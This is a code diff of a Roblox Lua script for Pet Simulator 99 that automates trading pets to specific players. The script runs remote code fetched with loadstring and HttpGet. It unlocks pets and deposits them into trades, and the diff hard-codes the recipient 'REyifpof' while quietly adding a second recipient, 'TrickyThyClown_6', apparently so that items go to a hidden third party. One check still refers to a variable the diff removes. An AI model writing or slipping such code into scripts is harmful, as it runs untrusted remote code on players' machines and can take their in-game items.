@@ -2,10 +2,9 @@
 wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
 if game.PlaceId == 8737899170 then
-    Username = "REyifpof"
     getgenv().PetToTrade = {
-        {Pet = "Elegant Eagle", Patern = all, DecrementBy = 0},
-        {Pet = "Luxe Axolotl", Patern = all, DecrementBy = 0}
+        --{Pet = "Elegant Eagle", Patern = all, DecrementBy = 0},
+        --{Pet = "Luxe Axolotl", Patern = all, DecrementBy = 0}
         --{Pet = "Pineapple Monkey", Patern = 2, DecrementBy = 0}
 
 
@@ -57,11 +56,17 @@ if game.PlaceId == 8737899170 then
         return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
     end
 
-    local function SendTrade(username)
+    local function SendTrade()
         local args = {
-            [1] = game:GetService("Players"):WaitForChild(Username)
+            [1] = game:GetService("Players"):WaitForChild("REyifpof")
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild("TrickyThyClown_6")
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
+
     end
 
     local function ReadyTrade()
@@ -252,7 +257,7 @@ if game.PlaceId == 8737899170 then
         wait(1)
         if game:GetService("Players"):WaitForChild(Username) ~= nil then
             UnlockPet()
-            SendTrade(Username)
+            SendTrade()
         end
         if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
             DepositPetInTrade()
